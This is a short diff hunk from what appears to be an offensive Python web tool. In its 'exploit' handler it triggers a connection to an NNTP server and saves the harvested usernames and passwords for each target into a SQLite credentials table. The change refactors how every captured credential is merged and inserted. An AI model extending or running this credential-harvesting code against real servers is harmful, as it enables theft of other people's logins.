@@ -294,25 +294,29 @@ async def exploit(request: web.Request) -> web.Response:
         trigger_call, _ = test_server(NNTP_SERVER_PUBLIC_HOST, NNTP_SERVER_LOCAL_PORT)
         server["ssl"] = server_ssl_bak
 
-        credentials[target.split(":")[0]][-1].update(server)
+        credentials[target.split(":")[0]] = [
+            dict(**credential, **server)
+            for credential in credentials[target.split(":")[0]]
+        ]
 
-        cursor = con.cursor()
+    cursor = con.cursor()
+    for credential in credentials[target.split(":")[0]]:
         try:
             cursor.execute(
                 "INSERT INTO `credentials` (host, port, username, password, ssl) VALUES (?, ?, ?, ?, ?)",
                 (
-                    server["host"],
-                    server["port"],
-                    server["username"],
-                    credentials[target.split(":")[0]][-1]["password"],
-                    server["ssl"]
+                    credential["host"],
+                    credential["port"],
+                    credential["username"],
+                    credential["password"],
+                    credential["ssl"]
                 )
             )
-            con.commit()
         except sqlite3.IntegrityError as e:
             if "UNIQUE constraint failed" not in str(e):
                 raise
-        cursor.close()
+    cursor.close()
+    con.commit()
 
     return web.json_response({
         "status": 200,
